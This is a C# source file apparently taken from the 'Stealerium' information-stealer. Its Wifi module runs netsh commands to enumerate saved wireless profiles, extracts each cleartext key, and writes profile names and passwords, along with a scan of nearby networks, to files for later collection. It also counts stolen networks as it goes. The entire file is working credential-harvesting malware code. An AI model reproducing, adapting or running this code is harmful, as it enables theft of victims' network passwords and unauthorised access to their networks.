using System;
using System.IO;
using System.Linq;
using Stealerium.Helpers;

namespace Stealerium.Target.System
{
    internal sealed class Wifi
    {
        // Get WiFi profile names
        private static string[] GetProfiles()
        {
            try
            {
                // Execute the command to get WiFi profiles
                var output = CommandHelper.Run("chcp 65001 && netsh wlan show profile | findstr All");

                // Split output by lines and clean up each profile name
                var profileNames = output.Split(new[] { '\r', '\n' }, StringSplitOptions.RemoveEmptyEntries)
                                         .Select(line => line.Substring(line.LastIndexOf(':') + 1).Trim())
                                         .ToArray();

                return profileNames;
            }
            catch (Exception ex)
            {
                // Log any errors
                Logging.Log($"Wifi - GetProfiles: Failed to retrieve WiFi profiles. Error: {ex.Message}");
                return Array.Empty<string>();
            }
        }

        // Get WiFi password by profile name
        private static string GetPassword(string profile)
        {
            try
            {
                // Execute the command to get WiFi password for the profile
                var output = CommandHelper.Run($"chcp 65001 && netsh wlan show profile name=\"{profile}\" key=clear | findstr Key");

                // Extract and return the password
                return output.Split(':').Last().Trim();
            }
            catch (Exception ex)
            {
                // Log the error and return a default message
                Logging.Log($"Wifi - GetPassword: Failed to retrieve password for profile '{profile}'. Error: {ex.Message}");
                return "Password not found";
            }
        }

        // Save all visible WiFi networks to file
        public static void ScanningNetworks(string savePath)
        {
            try
            {
                // Execute the command to scan for visible networks
                var output = CommandHelper.Run("chcp 65001 && netsh wlan show networks mode=bssid");

                if (!output.Contains("is not running"))
                {
                    // Save the scan result to the file
                    File.AppendAllText(Path.Combine(savePath, "ScanningNetworks.txt"), output);
                }
            }
            catch (Exception ex)
            {
                // Log any errors during scanning
                Logging.Log($"Wifi - ScanningNetworks: Failed to scan networks. Error: {ex.Message}");
            }
        }

        // Save WiFi networks with passwords to file
        public static void SavedNetworks(string savePath)
        {
            try
            {
                // Get all saved WiFi profiles
                var profiles = GetProfiles();

                foreach (var profile in profiles)
                {
                    // Skip invalid profiles
                    if (profile.Equals("65001"))
                        continue;

                    // Increment the saved networks counter
                    Counter.SavedWifiNetworks++;

                    // Get the password for the profile
                    var password = GetPassword(profile);

                    // Format the output for saving
                    var output = $"PROFILE: {profile}\nPASSWORD: {password}\n\n";

                    // Save the profile and password to the file
                    File.AppendAllText(Path.Combine(savePath, "SavedNetworks.txt"), output);
                }
            }
            catch (Exception ex)
            {
                // Log any errors during saving networks
                Logging.Log($"Wifi - SavedNetworks: Failed to save networks. Error: {ex.Message}");
            }
        }
    }
}
